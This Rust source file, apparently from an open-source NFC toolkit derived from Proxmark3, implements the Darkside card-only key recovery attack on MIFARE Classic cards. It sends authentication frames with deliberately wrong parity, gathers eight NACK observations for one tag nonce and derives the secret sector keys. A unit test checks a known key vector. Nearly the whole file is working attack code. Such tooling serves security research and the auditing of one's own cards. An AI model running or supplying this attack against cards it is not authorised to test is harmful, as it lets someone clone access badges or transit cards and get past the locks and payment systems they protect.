// SPDX-FileCopyrightText: Proxmark3 contributors
// SPDX-FileCopyrightText: 2026 NFC Foundry contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! Darkside (card-only) key recovery.
//!
//! The attack needs eight NACK observations with one tag nonce. PM3 schedules
//! authentication frames from FPGA timing so the PRNG returns the same nonce.
//! Standard host-driven readers cannot reproduce that scheduling; this
//! implementation collects whatever repeated nonce the card exposes and fails
//! honestly when the PRNG has already moved on.

use nfc_core::{CancelToken, Key, KeyType, NfcError, Result};
use nfc_transport::Reader;

use crate::acquire::{crc_a, select_card};
use crate::crypto1::{nonce2key, odd_parity8};
use crate::mfkey::key_from_u64;

const AUTH_A: u8 = 0x60;
const AUTH_B: u8 = 0x61;
const NACK: u8 = 0x05;

#[derive(Clone, Copy, Debug)]
pub struct DarksideSample {
    pub uid: u32,
    pub tag_nonce: u32,
    pub reader_nonce: u32,
    pub reader_response: u32,
    pub parity_info: u64,
    pub keystream_info: u64,
}

/// Recovers candidate keys from a completed eight-observation sample.
pub fn solve(sample: &DarksideSample) -> Vec<Key> {
    nonce2key(
        sample.uid,
        sample.tag_nonce,
        sample.reader_nonce,
        sample.reader_response,
        sample.parity_info,
        sample.keystream_info,
    )
    .into_iter()
    .map(key_from_u64)
    .collect()
}

#[derive(Clone, Copy)]
struct Slot {
    parity: u8,
    answer: u8,
}

#[derive(Default)]
struct Group {
    uid: u32,
    slots: [Option<Slot>; 8],
    parity_high: Option<u8>,
}

/// Collects a darkside sample. Returns `None` when the card never repeats a
/// nonce often enough for host-driven acquisition.
pub fn collect(
    reader: &mut dyn Reader,
    block: u8,
    key_type: KeyType,
    cancel: &CancelToken,
    max_attempts: usize,
) -> Result<Option<DarksideSample>> {
    use std::collections::HashMap;

    let mut groups: HashMap<u32, Group> = HashMap::new();
    let mut attempts = 0;
    let mut selected = false;
    let mut uid = 0u32;

    while attempts < max_attempts {
        cancel.check()?;
        attempts += 1;

        if !selected {
            reader.set_recovery_mode(false)?;
            let (_, card_uid) = select_card(reader)?;
            uid = card_uid;
            reader.set_recovery_mode(true)?;
            selected = true;
        }

        let Some(tag_nonce) = partial_auth(reader, block, key_type)? else {
            selected = false;
            continue;
        };
        let group = groups.entry(tag_nonce).or_default();
        group.uid = uid;
        let Some(slot_index) = group.slots.iter().position(Option::is_none) else {
            return Ok(build_sample(tag_nonce, group));
        };

        let Some((parity, answer)) =
            fake_reader_response(reader, slot_index as u8, group.parity_high)?
        else {
            selected = false;
            continue;
        };
        if answer != NACK {
            selected = false;
            continue;
        }
        let high = parity & 0xE0;
        group.parity_high.get_or_insert(high);
        group.slots[slot_index] = Some(Slot { parity, answer });

        if group.slots.iter().all(Option::is_some) {
            return Ok(build_sample(tag_nonce, group));
        }
        if groups.len() > 64 {
            let complete = groups
                .values()
                .any(|value| value.slots.iter().all(Option::is_some));
            if !complete {
                groups.clear();
            }
        }
    }
    Ok(None)
}

fn build_sample(tag_nonce: u32, group: &mut Group) -> Option<DarksideSample> {
    let mut parity_info = 0u64;
    let mut keystream_info = 0u64;
    for (index, slot) in group.slots.iter().enumerate() {
        let slot = (*slot)?;
        let shift = (7 - index) * 8;
        parity_info |= u64::from(reflect8(slot.parity)) << shift;
        keystream_info |= u64::from(slot.answer ^ NACK) << shift;
    }
    Some(DarksideSample {
        uid: group.uid,
        tag_nonce,
        reader_nonce: 0,
        reader_response: 0,
        parity_info,
        keystream_info,
    })
}

fn partial_auth(reader: &mut dyn Reader, block: u8, key_type: KeyType) -> Result<Option<u32>> {
    let mut command = vec![
        match key_type {
            KeyType::A => AUTH_A,
            KeyType::B => AUTH_B,
        },
        block,
    ];
    let crc = crc_a(&command);
    command.extend_from_slice(&crc);
    let parity: Vec<u8> = command.iter().map(|byte| odd_parity8(*byte)).collect();
    match reader.transceive_parity_expect(&command, &parity, 36) {
        Ok(response) => {
            if response.data.len() != 4 || response.bits != 32 {
                return Ok(None);
            }
            Ok(Some(u32::from_be_bytes([
                response.data[0],
                response.data[1],
                response.data[2],
                response.data[3],
            ])))
        }
        Err(NfcError::Timeout(_) | NfcError::NoCard) => Ok(None),
        Err(error) => Err(error),
    }
}

/// Sends a reader response with deliberately wrong parity and reads the NACK.
fn fake_reader_response(
    reader: &mut dyn Reader,
    nonce_delta: u8,
    parity_high: Option<u8>,
) -> Result<Option<(u8, u8)>> {
    let mut frame = [0u8; 8];
    frame[3] = nonce_delta << 5;
    let lows: Vec<u8> = match parity_high {
        Some(high) => (0..=0x1F).map(|low| high | low).collect(),
        None => (0..=0xFF).collect(),
    };
    for parity in lows {
        let parity_bits = [parity; 8];
        match reader.transceive_parity(&frame, &parity_bits) {
            Ok(response) => {
                if response.bits == 4 && response.data.len() == 1 {
                    return Ok(Some((parity, response.data[0])));
                }
                if response.bits == 32 {
                    return Ok(None);
                }
            }
            Err(NfcError::Timeout(_) | NfcError::NoCard) => return Ok(None),
            Err(error) => return Err(error),
        }
    }
    Ok(None)
}

fn reflect8(value: u8) -> u8 {
    value.reverse_bits()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pm3_nonce2key_vector_through_sample() {
        let sample = DarksideSample {
            uid: 0xE9CA_DD9C,
            tag_nonce: 0xA8BF_4A12,
            reader_nonce: 0,
            reader_response: 0,
            parity_info: 0xA020_A828_5858_B090,
            keystream_info: 0x050F_0106_0706_0E07,
        };
        let keys = solve(&sample);
        assert!(keys.iter().any(|key| key.to_hex() == "FC00018778F7"));
    }
}
